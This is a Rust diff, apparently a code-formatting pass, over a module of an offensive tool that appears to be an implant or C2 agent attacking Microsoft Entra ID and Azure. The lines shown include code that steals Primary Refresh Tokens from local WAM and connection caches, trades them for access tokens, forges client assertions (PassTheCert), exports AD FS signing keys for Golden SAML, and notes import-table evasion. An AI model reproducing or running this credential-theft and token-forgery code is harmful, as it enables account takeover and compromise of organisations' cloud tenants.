@@ -100,9 +100,9 @@ fn vault_url_for(vault_name: &str, cloud: &CloudEnvironment) -> String {
 /// Returns the current time as seconds since the UNIX epoch.
 fn now_epoch_secs() -> u64 {
     SystemTime::now()
-    .duration_since(UNIX_EPOCH)
-    .expect("system clock before UNIX epoch")
-    .as_secs()
+        .duration_since(UNIX_EPOCH)
+        .expect("system clock before UNIX epoch")
+        .as_secs()
 }
 
 // ---------------------------------------------------------------------------
@@ -192,7 +192,10 @@ impl AccessToken {
 fn decode_jwt_claims(jwt: &str) -> Result<HashMap<String, serde_json::Value>> {
     let parts: Vec<&str> = jwt.split('.').collect();
     if parts.len() != 3 {
-        bail!("invalid JWT: expected 3 dot-separated segments, got {}", parts.len());
+        bail!(
+            "invalid JWT: expected 3 dot-separated segments, got {}",
+            parts.len()
+        );
     }
     let payload_bytes = URL_SAFE_NO_PAD
         .decode(parts[1])
@@ -203,10 +206,17 @@ fn decode_jwt_claims(jwt: &str) -> Result<HashMap<String, serde_json::Value>> {
 }
 
 /// Extract common fields from a PRT JWT into a `PrimaryRefreshToken`.
-fn parse_prt_jwt(prt_value: &str, session_key: Option<String>, source: PrtSource) -> Result<PrimaryRefreshToken> {
+fn parse_prt_jwt(
+    prt_value: &str,
+    session_key: Option<String>,
+    source: PrtSource,
+) -> Result<PrimaryRefreshToken> {
     let claims = decode_jwt_claims(prt_value)?;
 
-    let upn = claims.get("upn").and_then(|v| v.as_str()).map(|s| s.to_string());
+    let upn = claims
+        .get("upn")
+        .and_then(|v| v.as_str())
+        .map(|s| s.to_string());
     let tenant_id = claims
         .get("tid")
         .or_else(|| claims.get("tenant_id"))
@@ -355,8 +365,7 @@ impl PrtTheft {
         //   %LOCALAPPDATA%\\Microsoft\\Windows\\Connections\\PrtCache
         //   %LOCALAPPDATA%\\Microsoft\\Credentials\\*
         // We look for JSON blobs containing "RefreshToken" or "PrimaryRefreshToken".
-        let local_app_data = std::env::var("LOCALAPPDATA")
-            .context("LOCALAPPDATA not set")?;
+        let local_app_data = std::env::var("LOCALAPPDATA").context("LOCALAPPDATA not set")?;
 
         // Check the connections cache
         let connections_dir = format!("{local_app_data}\\Microsoft\\Windows\\Connections");
@@ -399,8 +408,7 @@ impl PrtTheft {
     fn steal_prt_from_wam(&self) -> Result<PrimaryRefreshToken> {
         // WAM token cache path:
         //   %LOCALAPPDATA%\\Microsoft\\TokenBroker\\Accounts\\*
-        let local_app_data = std::env::var("LOCALAPPDATA")
-            .context("LOCALAPPDATA not set")?;
+        let local_app_data = std::env::var("LOCALAPPDATA").context("LOCALAPPDATA not set")?;
         let cache_dir = format!("{local_app_data}\\Microsoft\\TokenBroker\\Accounts");
 
         if let Ok(entries) = std::fs::read_dir(&cache_dir) {
@@ -438,7 +446,8 @@ impl PrtTheft {
                         for sub_entry in sub_entries.flatten() {
                             let sub_path = sub_entry.path();
                             if let Ok(data) = std::fs::read(&sub_path) {
-                                if let Ok(prt) = self.try_parse_prt_blob(&data, PrtSource::CloudAp) {
+                                if let Ok(prt) = self.try_parse_prt_blob(&data, PrtSource::CloudAp)
+                                {
                                     return Ok(prt);
                                 }
                             }
@@ -516,10 +525,17 @@ impl PrtTheft {
         match val {
             serde_json::Value::Object(map) => {
                 // Check known PRT field names
-                for key in &["refresh_token", "RefreshToken", "prt", "primary_refresh_token", "SignInStateCookie"] {
+                for key in &[
+                    "refresh_token",
+                    "RefreshToken",
+                    "prt",
+                    "primary_refresh_token",
+                    "SignInStateCookie",
+                ] {
                     if let Some(v) = map.get(*key) {
                         if let Some(s) = v.as_str() {
-                            if s.starts_with("eyJ") && s.chars().filter(|c| *c == '.').count() >= 2 {
+                            if s.starts_with("eyJ") && s.chars().filter(|c| *c == '.').count() >= 2
+                            {
                                 return Some(s.to_string());
                             }
                         }
@@ -555,7 +571,11 @@ impl PrtTheft {
                 }
             }
         }
-        if s.len() > 20 { Some(s.len()) } else { None }
+        if s.len() > 20 {
+            Some(s.len())
+        } else {
+            None
+        }
     }
 
     /// Use a stolen PRT to obtain an access token for a specific resource.
@@ -576,10 +596,7 @@ impl PrtTheft {
     ) -> Result<AccessToken> {
         // Determine the tenant.  Use the tenant from the PRT if available,
         // otherwise fall back to "common" (which will use the home tenant).
-        let tenant = prt
-            .tenant_id
-            .as_deref()
-            .unwrap_or("common");
+        let tenant = prt.tenant_id.as_deref().unwrap_or("common");
 
         let token_endpoint = token_endpoint_for(&self.cloud, tenant);
 
@@ -605,11 +622,7 @@ impl PrtTheft {
         if !resp.status().is_success() {
             let status = resp.status();
             let body = resp.text().await.unwrap_or_default();
-            bail!(
-                "PRT token exchange failed: HTTP {} — {}",
-                status,
-                body
-            );
+            bail!("PRT token exchange failed: HTTP {} — {}", status, body);
         }
 
         let token_resp: TokenResponse = resp
@@ -631,7 +644,10 @@ impl PrtTheft {
     /// This is useful when the operator has obtained a PRT through other
     /// means (e.g., from a different compromised host) and wants to use
     /// it from this agent.
-    pub fn prt_from_raw(prt_value: &str, session_key: Option<String>) -> Result<PrimaryRefreshToken> {
+    pub fn prt_from_raw(
+        prt_value: &str,
+        session_key: Option<String>,
+    ) -> Result<PrimaryRefreshToken> {
         parse_prt_jwt(prt_value, session_key, PrtSource::OperatorProvided)
     }
 }
@@ -826,7 +842,12 @@ fn build_and_sign_jwt(
     let signing_input = format!("{header_b64}.{claims_b64}");
     let mut signature = vec![0u8; key_pair.public().modulus_len()];
     key_pair
-        .sign(&RSA_PKCS1_SHA256, &rng, signing_input.as_bytes(), &mut signature)
+        .sign(
+            &RSA_PKCS1_SHA256,
+            &rng,
+            signing_input.as_bytes(),
+            &mut signature,
+        )
         .map_err(|e| anyhow!("RSA signing failed: {e:?}"))?;
 
     let sig_b64 = URL_SAFE_NO_PAD.encode(&signature);
@@ -862,7 +883,10 @@ impl PassTheCert {
         let params = [
             ("grant_type", "client_credentials"),
             ("client_id", &self.client_id),
-            ("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"),
+            (
+                "client_assertion_type",
+                "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+            ),
             ("client_assertion", &assertion),
             ("scope", &scope_str),
         ];
@@ -1205,10 +1229,7 @@ impl GoldenSaml {
     /// and private key (e.g., via PowerShell `Get-AdfsCertificate` or by
     /// exporting from the certificate store), this function validates and
     /// returns them.
-    pub fn load_adfs_key_from_files(
-        cert_pem: &str,
-        key_pem: &str,
-    ) -> Result<(Vec<u8>, Vec<u8>)> {
+    pub fn load_adfs_key_from_files(cert_pem: &str, key_pem: &str) -> Result<(Vec<u8>, Vec<u8>)> {
         let cert_der = pem_to_der_local(cert_pem)?;
         let key_der = pem_to_der_local(key_pem)?;
 
@@ -1226,7 +1247,9 @@ impl GoldenSaml {
         // AD FS v4+ uses thumbprint attribute
         for line in config_xml.lines() {
             let line_lower = line.to_lowercase();
-            if line_lower.contains("tokensigningcertificate") || line_lower.contains("signingcertificate") {
+            if line_lower.contains("tokensigningcertificate")
+                || line_lower.contains("signingcertificate")
+            {
                 // Extract thumbprint attribute value
                 if let Some(thumbprint) = Self::extract_attribute(line, "thumbprint") {
                     return Ok(thumbprint);
@@ -1259,8 +1282,8 @@ impl GoldenSaml {
     /// Uses runtime-resolved CryptoAPI calls (no IAT entries).
     #[cfg(windows)]
     fn export_cert_from_store(thumbprint: &str) -> Result<(Vec<u8>, Vec<u8>)> {
-        use std::os::raw::c_void;
         use crate::win_types::DWORD;
+        use std::os::raw::c_void;
 
         // Runtime-resolve CertOpenStore, CertFindCertificateInStore, etc.
         // For now, use a simplified approach: read from the cert store files
@@ -1290,7 +1313,9 @@ impl GoldenSaml {
             bail!("PowerShell cert export failed: {}", stderr);
         }
 
-        let output_str = String::from_utf8_lossy(&cert_output.stdout).trim().to_string();
+        let output_str = String::from_utf8_lossy(&cert_output.stdout)
+            .trim()
+            .to_string();
         let parts: Vec<&str> = output_str.split('|').collect();
         if parts.len() != 2 {
             bail!("unexpected PowerShell cert export output format");
@@ -1338,7 +1363,11 @@ fn days_to_ymd(mut days: i64) -> (i64, i64, i64) {
 
     let month_offset = (52 * (day_of_year + 1)) / 1531;
     let day = day_of_year - (153 * month_offset + 2) / 5 + 1;
-    let month = if month_offset < 10 { month_offset + 3 } else { month_offset - 9 };
+    let month = if month_offset < 10 {
+        month_offset + 3
+    } else {
+        month_offset - 9
+    };
 
     (year, month, day)
 }
@@ -1529,17 +1558,19 @@ impl TokenUtil {
             bail!("Graph API query failed: HTTP {} — {}", status, body);
         }
 
-        resp.json().await.context("failed to parse Graph API response")
+        resp.json()
+            .await
+            .context("failed to parse Graph API response")
     }
 
     /// List Azure resources (subscriptions) accessible with the token.
     ///
     /// Uses the Azure Resource Manager API to enumerate subscriptions.
-    pub async fn list_azure_resources(
-        &self,
-        access_token: &str,
-    ) -> Result<AzureSubscriptionList> {
-        let url = format!("{}/subscriptions?api-version=2020-01-01", arm_url_for(&self.cloud));
+    pub async fn list_azure_resources(&self, access_token: &str) -> Result<AzureSubscriptionList> {
+        let url = format!(
+            "{}/subscriptions?api-version=2020-01-01",
+            arm_url_for(&self.cloud)
+        );
 
         let resp = self
             .http_client
@@ -1692,10 +1723,7 @@ impl TokenUtil {
     }
 
     /// Get the current user's profile from Graph API.
-    pub async fn get_current_user(
-        &self,
-        access_token: &str,
-    ) -> Result<GraphMeResponse> {
+    pub async fn get_current_user(&self, access_token: &str) -> Result<GraphMeResponse> {
         self.query_graph_with_token(access_token, "/v1.0/me", None)
             .await
     }
@@ -1842,7 +1870,8 @@ mod tests {
     fn test_decode_jwt_claims_valid() {
         // Create a minimal JWT: header.payload.signature
         let header = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256","typ":"JWT"}"#);
-        let payload = URL_SAFE_NO_PAD.encode(r#"{"sub":"test-user","upn":"test@contoso.com","tid":"tenant-123"}"#);
+        let payload = URL_SAFE_NO_PAD
+            .encode(r#"{"sub":"test-user","upn":"test@contoso.com","tid":"tenant-123"}"#);
         let jwt = format!("{header}.{payload}.fake-signature");
 
         let claims = decode_jwt_claims(&jwt).unwrap();
@@ -1865,12 +1894,18 @@ mod tests {
 
     #[test]
     fn test_parse_prt_jwt_extracts_fields() {
-        let claims_json = r#"{"sub":"obj-123","upn":"admin@contoso.com","tid":"tenant-456","isu":"aad"}"#;
+        let claims_json =
+            r#"{"sub":"obj-123","upn":"admin@contoso.com","tid":"tenant-456","isu":"aad"}"#;
         let payload_b64 = URL_SAFE_NO_PAD.encode(claims_json);
         let header_b64 = URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256"}"#);
         let jwt = format!("{header_b64}.{payload_b64}.sig");
 
-        let prt = parse_prt_jwt(&jwt, Some("session-key-base64".to_string()), PrtSource::BrowserCookie).unwrap();
+        let prt = parse_prt_jwt(
+            &jwt,
+            Some("session-key-base64".to_string()),
+            PrtSource::BrowserCookie,
+        )
+        .unwrap();
         assert_eq!(prt.upn.as_deref(), Some("admin@contoso.com"));
         assert_eq!(prt.tenant_id.as_deref(), Some("tenant-456"));
         assert_eq!(prt.object_id.as_deref(), Some("obj-123"));
@@ -1881,7 +1916,10 @@ mod tests {
     #[test]
     fn test_xml_escape() {
         assert_eq!(xml_escape("hello"), "hello");
-        assert_eq!(xml_escape("a<b>c&d\"e\"f'g"), "a&lt;b&gt;c&amp;d&quot;e&quot;f&apos;g");
+        assert_eq!(
+            xml_escape("a<b>c&d\"e\"f'g"),
+            "a&lt;b&gt;c&amp;d&quot;e&quot;f&apos;g"
+        );
     }
 
     #[test]
@@ -1925,8 +1963,14 @@ mod tests {
         let te = token_endpoint_for(&CloudEnvironment::Commercial, "test-tenant");
         assert!(te.contains("login.microsoftonline.com"));
         assert!(te.contains("test-tenant"));
-        assert_eq!(graph_url_for(&CloudEnvironment::Commercial), "https://graph.microsoft.com");
-        assert_eq!(arm_url_for(&CloudEnvironment::Commercial), "https://management.azure.com");
+        assert_eq!(
+            graph_url_for(&CloudEnvironment::Commercial),
+            "https://graph.microsoft.com"
+        );
+        assert_eq!(
+            arm_url_for(&CloudEnvironment::Commercial),
+            "https://management.azure.com"
+        );
         assert_eq!(
             vault_url_for("myvault", &CloudEnvironment::Commercial),
             "https://myvault.vault.azure.net"
@@ -1937,8 +1981,14 @@ mod tests {
     fn test_cloud_endpoints_government() {
         let te = token_endpoint_for(&CloudEnvironment::Government, "test-tenant");
         assert!(te.contains("login.microsoftonline.us"));
-        assert_eq!(graph_url_for(&CloudEnvironment::Government), "https://graph.microsoft.us");
-        assert_eq!(arm_url_for(&CloudEnvironment::Government), "https://management.usgovcloudapi.net");
+        assert_eq!(
+            graph_url_for(&CloudEnvironment::Government),
+            "https://graph.microsoft.us"
+        );
+        assert_eq!(
+            arm_url_for(&CloudEnvironment::Government),
+            "https://management.usgovcloudapi.net"
+        );
         assert_eq!(
             vault_url_for("myvault", &CloudEnvironment::Government),
             "https://myvault.vault.usgovcloudapi.net"
